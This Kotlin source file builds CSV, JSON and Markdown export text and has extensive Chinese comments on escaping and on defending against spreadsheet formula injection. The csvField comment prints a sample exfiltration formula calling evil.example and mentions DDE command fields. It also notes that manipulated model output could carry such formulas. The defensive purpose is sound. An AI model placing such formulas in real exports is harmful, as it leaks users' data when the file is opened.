package com.pocketagent.filelogic

import java.util.Locale

/**
 * 办公文档的**文本组装**。
 *
 * ═══════════════════════════════════════════════════════════════
 *  为什么这些看起来"就是拼字符串"的东西值得单独一个文件 + 一组测试
 * ═══════════════════════════════════════════════════════════════
 *
 * 因为它们拼出来的东西会**在别的程序里被解析**，而解析失败的后果
 * 不是"报错"，是"内容不对但看起来正常"：
 *
 * | 漏了什么 | 用户看到的现象 | 会去查的方向 |
 * |---|---|---|
 * | CSV 字段含逗号没加引号 | Excel 里列全错位，数据看着像乱的 | "你导出的数据是错的" |
 * | CSV 的 `"` 没翻倍 | 该字段被截断，后半句跑进下一列 | 同上 |
 * | UTF-8 CSV 没写 BOM | **中文全是乱码** | "你写的是乱码文件" |
 * | 单元格以 `=` 开头 | Excel 把它当**公式执行** | 不知道，可能已经出事了 |
 * | JSON 里中文被转成 `\uXXXX` | 文件体积 6 倍，且人完全读不懂 | "这文件怎么打不开" |
 *
 * 每一条都是"文件生成成功了、也打开成功了、但内容是错的"。
 * 而这正是本项目反复强调的那一类故障：**没有异常，只有假象。**
 *
 * ⚠️ 本模块只做**文本组装**，不碰文件系统、不碰 `android.*`。
 *    落盘由通道实现负责，且必须走 `AtomicTextFile`（半截文件同样是静默故障）。
 */
object OfficeText {

    /** UTF-8 BOM。Excel 靠它判断编码，没有它中文必乱码。 */
    const val CSV_BOM = "\uFEFF"

    /** RFC 4180 规定用 CRLF。Excel 对 LF 的兼容性时好时坏。 */
    private const val CRLF = "\r\n"

    /**
     * 带符号的合法数字（整数、小数、科学计数法）。
     *
     * 用途见 [csvField]：判断一个以 `-` / `+` 开头的字段是"数字的符号"
     * 还是"公式注入"。
     *
     * ⚠️ 符号两边都要覆盖。只给 `-` 开例外会让规则自相矛盾：
     *    `-5` 原样输出而 `+5` 被加引号，而用户看不出这两者有什么区别。
     *    **一条解释不清的规则，迟早会被人"顺手改简单"。**
     */
    private val NUMERIC = Regex("""^[+-]?\d+(\.\d+)?([eE][+-]?\d+)?$""")

    /**
     * 转义一个 CSV 字段。
     *
     * ═══════════════════════════════════════════════════════════════
     *  ★★ 关于"公式注入"：这不是洁癖，是一个真实的攻击面
     * ═══════════════════════════════════════════════════════════════
     *
     * Excel / WPS / LibreOffice 都会把以 `=` `+` `-` `@` 开头的单元格
     * 当作**公式**求值。所以一份"看起来只是数据"的 CSV：
     *
     * ```
     * =HYPERLINK("http://evil.example/"&A1,"点我")
     * ```
     *
     * 在用户打开它的那一刻就会把 A1 的内容发出去。老版本 Excel 的
     * DDE 甚至能执行本地命令。
     *
     * **为什么这件事在本项目里格外要紧**：CSV 的内容常常来自模型输出，
     * 而模型输出是可以被诱导的（用户读到的网页、别人发来的消息，
     * 都可能成为它的输入）。也就是说，**这条注入链的上游是用户无法控制的**。
     *
     * 缓解手段是给可疑字段**加一个前导单引号** —— 那会让 Excel
     * 把它当文本而不是公式。
     *
     * ⚠️ 但代价是**内容被改了**（多了一个 `'`）。所以这里做了两件事：
     *    1. **正负号不算可疑** —— 前提是整个字段是一个合法的数字。
     *       `-5`、`+5`、`-3.14`、`-1e9` 原样输出；而 `-2+3+cmd|...` 会被加引号。
     *       这个例外是必要的：数据表里负数太常见，一律加引号会让导出的
     *       表格到处是 `'-5`，用户会以为我们写坏了。
     *    2. 提供 [toCsv] 的 `neutralizeFormulas` 开关，纯数据导出可以关掉。
     *       默认**开**（安全优先）。
     */
    fun csvField(raw: String, neutralizeFormulas: Boolean = true): String {
        val body = if (neutralizeFormulas && looksLikeFormula(raw)) "'$raw" else raw

        // 需要加引号的情形：含分隔符/引号/换行，或首尾有空白
        // ⚠️ 首尾空白那条容易被当成多余 —— Excel 打开 CSV 时会**trim 单元格**，
        //    所以「 你好 」会被悄悄变成「你好」。加引号能保住它。
        val needsQuote = body.any { it == ',' || it == '"' || it == '\n' || it == '\r' } ||
            body != body.trim()

        return if (needsQuote) {
            // RFC 4180：字段内的 `"` 要翻倍
            "\"" + body.replace("\"", "\"\"") + "\""
        } else {
            body
        }
    }

    /**
     * 组装一份完整的 CSV。
     *
     * @param includeBom 是否写 UTF-8 BOM。**默认写** ——
     *   不写的话 Excel 会按系统 ANSI 代码页解释，中文全是乱码。
     *   ⚠️ 但 BOM 会让"用 `head -1` 看第一行"之类的命令行操作看到
     *   一个多余的字符。所以给需要纯文本处理的场景留了关闭开关。
     *
     * @param neutralizeFormulas 见 [csvField]。默认**开**。
     */
    fun toCsv(
        header: List<String>,
        rows: List<List<String>>,
        includeBom: Boolean = true,
        neutralizeFormulas: Boolean = true,
    ): String = buildString {
        if (includeBom) append(CSV_BOM)

        append(header.joinToString(",") { csvField(it, neutralizeFormulas) })
        append(CRLF)

        for (row in rows) {
            append(row.joinToString(",") { csvField(it, neutralizeFormulas) })
            append(CRLF)
        }
    }

    /**
     * 转义一个 JSON 字符串字面量（含两端的引号）。
     *
     * ⚠️ 两条"**不做**"，都是刻意的：
     *
     * 1. **不转义 `/`。** 有些序列化器会把 `/` 写成 `\/`，那是给 HTML 内嵌
     *    JSON 用的（防止 `</script>` 提前闭合）。我们没有那个场景，
     *    而多转一次会**改变字节内容** —— 用户拿它做 diff 或哈希就会对不上。
     *
     * 2. **不把非 ASCII 转成 `\uXXXX`。** 那在 JSON 规范里是合法的，
     *    解码结果也一样，但一份中文 JSON 会膨胀到 6 倍，
     *    而且人眼完全读不了。JSON 本身规定用 UTF-8，直接写就行。
     *
     * 转义 `U+2028` / `U+2029` 是例外：它们在 JSON 里合法，
     * 但在 **JavaScript 源码里是行终止符**。我们不做 JSONP，
     * 但一份 JSON 被贴进 `.js` 里是很常见的用法，转义掉成本为零。
     */
    fun jsonString(raw: String): String = buildString(raw.length + 2) {
        append('"')
        for (ch in raw) {
            when (ch) {
                '"' -> append("\\\"")
                '\\' -> append("\\\\")
                '\n' -> append("\\n")
                '\r' -> append("\\r")
                '\t' -> append("\\t")
                '\b' -> append("\\b")
                '\u000C' -> append("\\f")
                '\u2028', '\u2029' ->
                    append(String.format(Locale.ROOT, "\\u%04x", ch.code))
                // 其余控制字符（含 DEL 与 C1）必须转义 —— 它们在 JSON 里非法
                else -> if (ch < ' ' || ch == '\u007F') {
                    append(String.format(Locale.ROOT, "\\u%04x", ch.code))
                } else {
                    append(ch)
                }
            }
        }
        append('"')
    }

    /**
     * 由"字段名 → 值"组装一个扁平 JSON 对象。
     *
     * ⚠️ 值**全部是字符串**。这一点是刻意的 —— 本层不做类型推断
     *    （把 `"007"` 推断成数字 7 会毁掉邮政编码和身份证号）。
     *    需要数字/布尔时由调用方自行组装。
     */
    fun toJsonStringMap(
        fields: List<Pair<String, String>>,
        indent: Int = 2,
    ): String {
        if (fields.isEmpty()) return "{}"
        val pad = " ".repeat(indent)
        return buildString {
            append("{\n")
            fields.forEachIndexed { index, (key, value) ->
                append(pad)
                append(jsonString(key))
                append(": ")
                append(jsonString(value))
                if (index != fields.lastIndex) append(',')
                append('\n')
            }
            append('}')
        }
    }

    /**
     * 组装 Markdown 表格。
     *
     * ⚠️ 单元格里的 `|` 必须转义成 `\|`，换行必须换成 `<br>` ——
     *    否则表格会**在渲染时错位**，而源文件看起来完全正常。
     *    这与 CSV 逗号没加引号是同一类故障。
     */
    fun toMarkdownTable(header: List<String>, rows: List<List<String>>): String = buildString {
        append("| ")
        append(header.joinToString(" | ") { markdownCell(it) })
        append(" |\n")

        append("|")
        repeat(header.size) { append(" --- |") }
        append('\n')

        for (row in rows) {
            append("| ")
            append(row.joinToString(" | ") { markdownCell(it) })
            append(" |\n")
        }
    }

    private fun markdownCell(raw: String): String =
        raw.replace("|", "\\|")
            .replace("\r\n", "<br>")
            .replace("\n", "<br>")
            .replace("\r", "<br>")

    /**
     * 这个字段会不会被表格软件当成公式。
     *
     * ⚠️ 关键细节：**找第一个非空白字符，而不是直接看 `raw[0]`**。
     *
     *    部分表格软件在判定"这是不是公式"之前会先忽略前导空白，
     *    所以 `"\t=cmd"` 与 `"=cmd"` 一样危险 —— 而只看 `raw[0]` 的实现
     *    会把前者放过去，还会把它当成"普通字段"不加引号。
     *
     *    这个坑是在测试里暴露的：最初把 `\t` / `\r` 直接列进"可疑首字符"，
     *    结果它们同时触发了"加单引号"和"加双引号"两条路径，
     *    生成出 `"'\rabc"` 这种既不像公式中和、也不像普通字段的东西。
     *    **改成先跳过空白之后，两种情况都归到同一条判断上。**
     */
    private fun looksLikeFormula(raw: String): Boolean {
        val idx = raw.indexOfFirst { it != ' ' && it != '\t' && it != '\r' && it != '\n' }
        // 整个字段全是空白 —— 不可能是公式
        if (idx < 0) return false

        return when (raw[idx]) {
            '=', '@' -> true

            // 正负号要看**整个字段**是不是一个合法数字：
            // `-5` 放行（负数太常见），`-2+3+cmd|...` 加引号。
            // ⚠️ 用 trim 后的值判断，这样 `" -5"` 这种"带前导空格的负数"
            //    不会因为空格而被误判成公式。
            '-', '+' -> !NUMERIC.matches(raw.trim())

            else -> false
        }
    }
}

/**
 * 能生成的文档格式。
 *
 * ⚠️ 只有**纯文本家族**。`.docx` / `.xlsx`（OOXML）本质是 zip + XML，
 *    用 JDK 的 `java.util.zip` 也能纯 Kotlin 生成，但那要写一整套
 *    XML 模板与关系文件，是独立一轮的工作量。
 *
 *    把它放在这里的价值是：**界面上「另存为」的选项与文件扩展名、
 *    MIME 类型只定义一次**，不会出现"下拉框里有 xlsx 但写不出来"这种
 *    自相矛盾的界面 —— 那种界面比少一个选项更伤人。
 */
enum class DocumentFormat(
    val extension: String,

    /** 给用户看，不要出现 "MIME" 之类的词 */
    val displayName: String,

    val mimeType: String,
) {
    TEXT("txt", "纯文本", "text/plain"),
    MARKDOWN("md", "Markdown", "text/markdown"),
    CSV("csv", "表格（CSV，可用 Excel 打开）", "text/csv"),
    JSON("json", "数据（JSON）", "application/json"),
}
